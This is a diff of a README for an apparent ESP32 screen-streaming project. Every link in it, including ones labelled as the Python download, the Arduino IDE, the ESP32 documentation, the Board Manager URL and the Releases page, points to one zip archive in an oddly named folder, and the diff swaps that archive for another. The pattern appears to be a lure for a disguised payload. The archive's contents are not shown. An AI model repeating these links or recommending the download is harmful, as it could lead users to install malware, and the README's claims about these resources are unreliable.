@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to the ESP32 Desktop Monitor project! This software allows you to stream your computer screen to an ESP32 T-Display over WiFi. Follow the steps below to get started.
 
-[![Download](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip%20Release-brightgreen)](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)
+[![Download](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip%20Release-brightgreen)](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip)
 
 ## 📦 What You Need
 To successfully use this application, ensure you have the following:
@@ -26,17 +26,17 @@ To successfully use this application, ensure you have the following:
 2. **ESP32 Board Support Package**
    - Add the following URL in Arduino IDE Preferences → Additional Board Manager URLs:
      ```
-     https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip
+     https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip
      ```
    - Install "esp32" by Espressif Systems via the Board Manager.
 
 ## 🔗 Download & Install
 To download the latest version of the application, visit the following link:
 
-[Download Latest Release](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)
+[Download Latest Release](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip)
 
 ### 📥 Installing the Software
-1. Go to the [Releases page](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip).
 2. Find the latest release of the software.
 3. Click on the download link for your operating system to start the download.
 
@@ -52,7 +52,7 @@ After downloading, follow these steps:
 6. Click the upload button (right arrow icon).
 
 ### For Computer Setup
-1. Ensure Python is installed on your computer. You can download it from [https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip).
+1. Ensure Python is installed on your computer. You can download it from [https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip).
 2. Open your terminal or command prompt.
 3. Install required screen capture libraries (if applicable):
    - For Windows, you might need to install libraries like `pygetwindow` and `mss`.
@@ -78,7 +78,7 @@ If you encounter issues, check the following:
 If you need assistance, consider reaching out through the project's GitHub issues page. For anyone interested in contributing, please review our contribution guidelines.
 
 ## 🔗 Reference Links
-- [ESP32 Documentation](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)
-- [Arduino IDE Download](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)
+- [ESP32 Documentation](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip)
+- [Arduino IDE Download](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip)
 
-### For further updates, don't forget to check back on the [Releases page](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip).
+### For further updates, don't forget to check back on the [Releases page](https://raw.githubusercontent.com/youcef-islam/ESP32-Desktop-Monitor/main/nonsenatorial/Desktop-Monitor-ES-3.0.zip).
